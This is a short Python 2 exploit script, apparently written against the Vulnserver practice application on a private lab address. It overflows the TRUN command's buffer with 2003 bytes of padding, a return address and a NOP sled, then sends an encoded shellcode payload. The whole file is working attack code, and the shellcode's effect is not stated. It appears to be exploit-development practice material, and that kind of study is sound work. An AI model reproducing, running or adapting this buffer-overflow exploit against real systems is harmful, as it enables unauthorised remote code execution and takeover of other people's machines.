#!/usr/bin/python

import sys, socket

payload = (
"\xba\x30\x86\xc7\xaf\xdd\xc2\xd9\x74\x24\xf4\x58\x2b\xc9"
"\xb1\x52\x83\xe8\xfc\x31\x50\x0e\x03\x60\x88\x25\x5a\x7c"
"\x7c\x2b\xa5\x7c\x7d\x4c\x2f\x99\x4c\x4c\x4b\xea\xff\x7c"
"\x1f\xbe\xf3\xf7\x4d\x2a\x87\x7a\x5a\x5d\x20\x30\xbc\x50"
"\xb1\x69\xfc\xf3\x31\x70\xd1\xd3\x08\xbb\x24\x12\x4c\xa6"
"\xc5\x46\x05\xac\x78\x76\x22\xf8\x40\xfd\x78\xec\xc0\xe2"
"\xc9\x0f\xe0\xb5\x42\x56\x22\x34\x86\xe2\x6b\x2e\xcb\xcf"
"\x22\xc5\x3f\xbb\xb4\x0f\x0e\x44\x1a\x6e\xbe\xb7\x62\xb7"
"\x79\x28\x11\xc1\x79\xd5\x22\x16\x03\x01\xa6\x8c\xa3\xc2"                      
"\x10\x68\x55\x06\xc6\xfb\x59\xe3\x8c\xa3\x7d\xf2\x41\xd8"                      
"\x7a\x7f\x64\x0e\x0b\x3b\x43\x8a\x57\x9f\xea\x8b\x3d\x4e"                      
"\x12\xcb\x9d\x2f\xb6\x80\x30\x3b\xcb\xcb\x5c\x88\xe6\xf3"                      
"\x9c\x86\x71\x80\xae\x09\x2a\x0e\x83\xc2\xf4\xc9\xe4\xf8"                                    
"\x41\x45\x1b\x03\xb2\x4c\xd8\x57\xe2\xe6\xc9\xd7\x69\xf6"
"\xf6\x0d\x3d\xa6\x58\xfe\xfe\x16\x19\xae\x96\x7c\x96\x91"
"\x87\x7f\x7c\xba\x22\x7a\x17\x05\x1a\xa9\x67\xed\x59\xb1"
"\x44\xc7\xd4\x57\xe0\x07\xb1\xc0\x9d\xbe\x98\x9a\x3c\x3e"
"\x37\xe7\x7f\xb4\xb4\x18\x31\x3d\xb0\x0a\xa6\xcd\x8f\x70"
"\x61\xd1\x25\x1c\xed\x40\xa2\xdc\x78\x79\x7d\x8b\x2d\x4f"
"\x74\x59\xc0\xf6\x2e\x7f\x19\x6e\x08\x3b\xc6\x53\x97\xc2"
"\x8b\xe8\xb3\xd4\x55\xf0\xff\x80\x09\xa7\xa9\x7e\xec\x11"
"\x18\x28\xa6\xce\xf2\xbc\x3f\x3d\xc5\xba\x3f\x68\xb3\x22"
"\xf1\xc5\x82\x5d\x3e\x82\x02\x26\x22\x32\xec\xfd\xe6\x52"
"\x0f\xd7\x12\xfb\x96\xb2\x9e\x66\x29\x69\xdc\x9e\xaa\x9b"
"\x9d\x64\xb2\xee\x98\x21\x74\x03\xd1\x3a\x11\x23\x46\x3a"
"\x30")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + payload

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.45.132', 9999))

	s.send(("TRUN /.:/" + shellcode))
	s.close()
except:
	print "Error connecter to server"
	sys.exit()